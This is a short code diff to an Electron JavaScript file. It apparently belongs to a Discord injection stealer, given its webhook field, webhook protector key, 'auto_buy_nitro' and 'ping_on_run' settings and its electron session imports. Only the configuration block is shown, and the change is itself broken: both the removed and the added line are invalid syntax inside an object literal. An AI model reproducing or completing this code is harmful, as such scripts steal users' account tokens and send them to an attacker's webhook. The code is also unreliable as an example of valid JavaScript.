@@ -6,7 +6,7 @@ const querystring = require('querystring');
 const { BrowserWindow, session } = require('electron');
 
 const config = {
-  wbk = 'da_webhook';
+  const wbk = 'da_webhook';
   webhook_protector_key: '%key%',
   auto_buy_nitro: false, 
   ping_on_run: true, 
